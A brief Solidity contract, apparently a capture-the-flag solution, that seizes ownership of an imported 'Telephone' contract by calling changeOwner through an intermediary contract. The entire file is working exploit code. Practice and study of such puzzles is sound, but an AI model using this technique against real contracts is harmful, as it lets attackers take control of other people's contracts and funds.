// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Telephone} from "./Telephone.sol";

contract TelephoneAttacker {
  Telephone telephone;
  address owner;

  constructor(address _telephoneAddress) {
    telephone = Telephone(_telephoneAddress);
    owner = msg.sender;
  }

  function attack() external{
    telephone.changeOwner(owner);
  }
}